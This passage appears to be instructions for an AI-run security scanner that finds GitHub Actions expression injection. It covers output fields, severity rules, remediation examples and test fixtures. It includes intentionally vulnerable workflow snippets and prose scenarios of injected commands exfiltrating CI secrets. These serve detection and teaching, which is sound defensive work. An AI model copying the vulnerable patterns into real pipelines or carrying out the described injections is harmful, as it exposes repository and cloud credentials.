      "title": "PR title injected into run: step in CI workflow with secret access",
      "description": "The CI workflow (.github/workflows/ci.yml, job: build, step: Print PR info) interpolates github.event.pull_request.title directly into a run: shell step via ${{ }} expression syntax. The workflow is triggered by pull_request, allowing any fork author to open a PR with a crafted title containing shell metacharacters. The workflow has access to GITHUB_TOKEN, AWS_ACCESS_KEY_ID, and DOCKER_PASSWORD, all of which can be exfiltrated by the injected command.",
      "location": { "file": ".github/workflows/ci.yml", "line": 42, "column": 14 },
      "remediation": "Move the value to an env: block and reference it as a shell variable. Replace: run: echo \"${{ github.event.pull_request.title }}\" with: env:\\n  PR_TITLE: ${{ github.event.pull_request.title }}\\nrun: echo \"$PR_TITLE\". Apply this pattern to all ${{ github.event.* }} values used in run: steps.",
      "exploitability": "reachable",
      "confidence": "high",
      "chain_id": "pipeline-secret-exfil"
    }
  ]
}
```

Field mapping from batch results to JSON:
- `id`: `pipelineinj-<N>` sequential
- `skill`: always `"sast-pipelineinj"`
- `severity`: `"critical"` when the workflow has access to secrets (GITHUB_TOKEN, deployment secrets, cloud creds); `"high"` when the runner has no secret access; `"medium"` for Likely Vulnerable with confirmed approval gate
- `title`: short one-line description of the injection point
- `description`: combine **Trigger**, **Injected expression**, **Injection context**, **Secrets exposed**, and **Attack scenario** from the batch result
- `location.file`: the workflow file path (relative to repo root)
- `location.line`: the line number where the `${{ github.event.* }}` expression appears inside `run:`
- `location.column`: column if visible; `null` if not determined
- `remediation`: from the **Remediation** field in the batch result
- `exploitability`: from the **exploitability** field
- `confidence`: from the **confidence** field
- `chain_id`: `"pipeline-secret-exfil"` when workflow has secret access; `null` otherwise

If no real findings exist (all candidates were Not Vulnerable), write `"findings": []` to the JSON file.

7. After writing both output files, **delete all intermediate files**: all `sast/pipelineinj-batch-*.md` files and `sast/pipelineinj-recon.md`. The only files that should remain are `sast/pipelineinj-results.md` and `sast/pipelineinj-results.json`.

---

## Severity Reference (CWE-94)

| Condition | Default Severity |
|---|---|
| Inline `${{ github.event.* }}` in `run:`, open trigger, workflow has secrets | **critical** |
| Inline `${{ github.event.* }}` in `run:`, open trigger, no secrets confirmed | **high** |
| Inline injection present, `pull_request_target` with approval gate | **high** (Likely Vulnerable) |
| GitLab / CircleCI injection with unquoted variables and external trigger | **high** |
| GitLab / CircleCI injection with internal-only trigger (no external contributor access) | **medium** |
| Env-var pass-through pattern (safe); push-only trigger; dead workflow | **info** (Not Vulnerable — omit from JSON) |

CWE reference: **CWE-94** (Improper Control of Generation of Code / Code Injection). Also related to **CWE-77** (Command Injection) and **CWE-20** (Improper Input Validation).

OWASP mapping: **A03:2021 — Injection**. GitHub Security Lab classification: **GitHub Actions expression injection**.

---

## Remediation Reference

Include the relevant remediation in every finding's `remediation` field.

**GitHub Actions — env var pass-through (primary fix for all expression injection)**

```yaml
# Before (vulnerable — any ${{ github.event.* }} inline in run:):
- name: Build
  run: |
    echo "PR: ${{ github.event.pull_request.title }}"
    git checkout ${{ github.head_ref }}
    curl -d "${{ github.event.pull_request.body }}" https://internal.example.com/notify

# After (safe — all untrusted values via env: block):
- name: Build
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
    HEAD_REF: ${{ github.head_ref }}
    PR_BODY: ${{ github.event.pull_request.body }}
  run: |
    echo "PR: $PR_TITLE"
    git checkout "$HEAD_REF"
    curl -d "$PR_BODY" https://internal.example.com/notify
```

**GitHub Actions — actions/github-script (use context object, not ${{ }})**

```yaml
# Before (vulnerable):
- uses: actions/github-script@v7
  with:
    script: |
      const title = '${{ github.event.pull_request.title }}';
      github.rest.issues.createComment({ body: `PR: ${title}` });

# After (safe — context.payload is the event payload, already a JS object):
- uses: actions/github-script@v7
  with:
    script: |
      const title = context.payload.pull_request.title;
      await github.rest.issues.createComment({
        owner: context.repo.owner,
        repo: context.repo.repo,
        issue_number: context.payload.pull_request.number,
        body: `PR: ${title}`
      });
```

**GitLab CI — validate branch name before use**

```yaml
# Before (vulnerable):
build:
  script:
    - echo "Building $CI_COMMIT_REF_NAME"
    - ./build.sh $CI_COMMIT_REF_NAME

# After (validate + quote):
build:
  script:
    - |
      echo "${CI_COMMIT_REF_NAME}" | grep -qE '^[a-zA-Z0-9][a-zA-Z0-9/_.-]*$' || {
        echo "ERROR: Invalid branch name format" >&2
        exit 1
      }
      echo "Building ${CI_COMMIT_REF_NAME}"
      ./build.sh "${CI_COMMIT_REF_SLUG}"  # CI_COMMIT_REF_SLUG is pre-slugified by GitLab
```

**CircleCI — validate pipeline parameters**

```yaml
# Before (vulnerable):
- run:
    command: |
      ./deploy.sh << pipeline.parameters.deploy_target >>

# After (allowlist validation):
- run:
    command: |
      TARGET="<< pipeline.parameters.deploy_target >>"
      case "$TARGET" in
        staging|production|preview) ./deploy.sh "$TARGET" ;;
        *) echo "ERROR: Unknown target: $TARGET" >&2; exit 1 ;;
      esac
```

**General guidance**:
- Treat every `github.event.*` value as untrusted user input — even fields that seem innocuous (PR title, branch name) can contain shell metacharacters, unicode zero-width characters, or environment variable references
- The `env:` block pass-through pattern is GitHub's own official recommendation and eliminates the injection class entirely
- Avoid `pull_request_target` workflows that check out untrusted code AND have access to secrets — this is a compound risk regardless of pipeline injection
- Add `permissions:` blocks to limit `GITHUB_TOKEN` scope to only what is needed: `permissions: contents: read` prevents write access even if injection occurs
- Consider adding a CODEOWNERS rule requiring security review for changes to `.github/workflows/` files
- Use `github.event.pull_request.user.login` to check if the PR author is a known contributor before running sensitive steps — but do NOT rely on this alone as the sole control

---

## Chains with Other Skills

Pipeline injection compounds significantly with secrets findings. When a pipeline injection site co-occurs with one of the following patterns, set `chain_id: "pipeline-secret-exfil"`:

- **sast-hardcodedsecrets**: A hardcoded secret in the repository can be exfiltrated by the injected shell command reading the file system. Set `chain_id: "pipeline-secret-exfil"` on both the pipeline injection finding and the hardcoded secrets finding.
- **sast-iac**: If the pipeline injection occurs in a workflow that applies Terraform or CloudFormation changes, the attacker can modify infrastructure by injecting into the plan/apply step, or exfiltrate the cloud credentials used for IaC deployment.
- **sast-ssrf**: An injected command can make arbitrary outbound requests from the CI runner network (which may have access to internal services), combining pipeline injection with SSRF.

Chain composition example:
```
sast-hardcodedsecrets finding: API_KEY hardcoded in src/config.py (accessible to the runner)
sast-pipelineinj finding: ${{ github.event.pull_request.title }} in run: step of ci.yml
→ chain_id: "pipeline-secret-exfil" on both
→ combined narrative: attacker opens PR with injected title, CI runner executes injected command,
  reads hardcoded API key from src/config.py, exfiltrates to attacker-controlled endpoint
```

---

## chain_id Values Defined by This Skill

| chain_id | Meaning |
|---|---|
| `pipeline-secret-exfil` | Pipeline injection sink is in a workflow with access to `GITHUB_TOKEN`, deployment secrets, or cloud credentials — the injection can directly exfiltrate those secrets. Set on both the pipeline injection finding and any co-located `sast-hardcodedsecrets` finding. |

---

## Test Fixture (True Positive / True Negative Reference)

The following minimal examples define what this skill MUST flag (TP) and MUST NOT flag (TN).

**TP — Must flag, exploitability: reachable, severity: critical**

```yaml
# .github/workflows/ci.yml
name: CI
on: [pull_request]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Echo PR title
        # TP: ${{ github.event.pull_request.title }} inline in run: with pull_request trigger
        run: echo "PR title: ${{ github.event.pull_request.title }}"
```

Expected finding: `pipelineinj-1`, severity `critical` (GITHUB_TOKEN is always present), exploitability `reachable`, confidence `high`, chain_id `"pipeline-secret-exfil"`.

**TP — Must flag, exploitability: reachable, severity: critical (head_ref)**

```yaml
# .github/workflows/build.yml
name: Build
on:
  pull_request:
    types: [opened, synchronize]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout branch
        run: git checkout ${{ github.head_ref }}
        # TP: head_ref is attacker-controlled branch name, inline in run:
```

**TN — Must NOT flag (env var pass-through — safe pattern)**

```yaml
# .github/workflows/ci.yml
name: CI
on: [pull_request]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Echo PR title
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}  # ← ${{ }} is in env: block
        run: echo "PR title: $PR_TITLE"                     # ← run: uses $PR_TITLE (shell var)
        # TN: the ${{ }} interpolation produces a value assigned to an env var;
        #     the shell never sees the raw expression — this is the SAFE pattern
```

**TN — Must NOT flag (push-only to protected branch)**

```yaml
# .github/workflows/release.yml
name: Release
on:
  push:
    branches: [main]   # protected branch — only trusted committers can push

jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - name: Tag release
        # TN: workflow only triggers on push to main (protected), not pull_request
        # External contributors cannot trigger this workflow
        run: git tag ${{ github.sha }}   # github.sha is trusted infrastructure value
```

Assert: only the TPs are flagged in results; TNs must appear as NOT VULNERABLE or be absent from the JSON findings array.

---

## Important Reminders

- This skill is **always-on** — it runs even when `sast/architecture.md` does not exist. Do not abort if the architecture file is missing; proceed directly to recon on CI config files.
- Phase 1 is purely structural: flag every `${{ github.event.* }}` expression found inside a `run:` block. Do not assess trigger reachability in Phase 1 — that is Phase 2's job.
- The single most important FP source is the **env var pass-through pattern**: `${{ github.event.pull_request.title }}` in an `env:` block is SAFE. Only flag when it appears inside the `run:` command text itself.
- `github.head_ref` is attacker-controlled (the PR source branch name). It is commonly used in `git checkout ${{ github.head_ref }}` steps — this is a real injection vector even though it looks innocuous.
- `GITHUB_TOKEN` is **always** available to GitHub Actions workflows, even when no explicit `secrets:` references exist. Any workflow with an inline `${{ github.event.* }}` in `run:` and a `pull_request` trigger should be classified as **critical** because `$GITHUB_TOKEN` can be used to push commits, create releases, call the GitHub API, and more.
- `pull_request_target` is particularly dangerous: unlike `pull_request`, it runs in the context of the BASE repository (with full secret access) even for fork PRs. An inline `${{ github.event.* }}` in `run:` on a `pull_request_target` trigger without an environment approval gate is always critical.
- `actions/github-script` with `${{ }}` in the `script:` block is injection into JavaScript, not just shell — it can call `require('child_process').execSync(...)` or use the `github` API client to perform any repository action.
- Batch size is **3 candidates per subagent**. If there are 1-3 candidates total, use a single subagent. If there are 10, use 4 subagents (3+3+3+1). Launch all batch subagents **in parallel**.
- Each batch subagent receives only its assigned candidates' text from the recon file, not the entire recon file.
- Clean up all intermediate files after writing the final reports: delete `sast/pipelineinj-recon.md` and all `sast/pipelineinj-batch-*.md` files. The only outputs that should persist are `sast/pipelineinj-results.md` and `sast/pipelineinj-results.json`.
- For `actions/github-script`, always check whether the `script:` value uses `${{ github.event.* }}` expressions directly in the JavaScript string (vulnerable) vs. uses `context.payload.*` (safe). The `context` object in github-script gives direct access to the event payload without template injection risk.
- When a finding chains with `sast-hardcodedsecrets` (hardcoded credential reachable from the CI runner), set `chain_id: "pipeline-secret-exfil"` on both findings and note the chain in the description field.
